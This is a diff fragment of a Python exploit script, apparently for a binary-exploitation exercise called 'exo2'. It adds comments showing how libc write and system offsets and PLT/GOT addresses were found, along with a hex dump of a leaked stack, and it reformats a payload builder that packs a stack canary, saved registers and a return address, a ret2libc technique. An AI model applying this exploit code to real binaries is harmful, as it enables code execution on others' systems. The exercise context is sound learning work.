@@ -121,34 +121,35 @@ def bruteforce_stack(size, i):
 
 RETURN_ADDRESS_OFFSET = 0x1527
 
-libc_write = 0x00113a70
+# readelf -s /lib32/libc.so.6 | grep -E ' write@@'
+libc_write = 0x001139b0
 
+#adelf -s /lib32/libc.so.6 | grep ' system@@'
 libc_system = 0x0004f8e0
 
+# objdump -R ./exo2 | grep write
 exo2_write = 0x00003fc4
 
+# objdump -d ./exo2 | grep -A3 '<write@plt>'
+# 000010c0 <write@plt>:
 exo2_write_plt = 0x000010c0
 
+# readelf -s ./exo2 | grep -i username
 username_offset = 0x4040
+
+# 00bfeb0590af155f0000000018e0b7fff285155fdeadbeef40b0155f
 
 def build_structured_payload(canary, ebx, esi, ebp, return_addr, fd):
 
     return pack(
 
         "<IIIIII",
-
         canary,
-
         ebx,
-
         esi,
-
         ebp,
-
         return_addr,
-
         fd
-
     )
 
 def print_values(canary, ebx, esi, ebp, return_addr, fd,
